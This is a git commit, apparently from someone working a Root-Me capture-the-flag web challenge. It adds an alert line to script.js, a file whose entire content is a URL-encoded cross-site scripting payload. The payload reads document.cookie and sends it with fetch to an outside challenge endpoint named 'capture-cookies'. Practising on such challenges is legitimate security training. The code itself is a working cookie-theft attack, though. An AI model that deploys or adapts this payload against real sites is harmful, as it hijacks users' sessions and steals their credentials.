77e9f741803d18b3aa51ab18d90d6c3da48d2865
Sandro <73789401+Just3Sandro@users.noreply.github.com>
2024-10-23 00:40:29 +0200

    qlert GENERALE

--- script.js
+++ script.js
@@ -1,4 +1,5 @@
 %3Cscript%3E
   var cookies = document.cookie;
+  alert(cookies);
   fetch('http://challenge01.root-me.org/web-client/ch62/capture-cookies?cookie=' + encodeURIComponent(cookies));
 %3C/script%3E
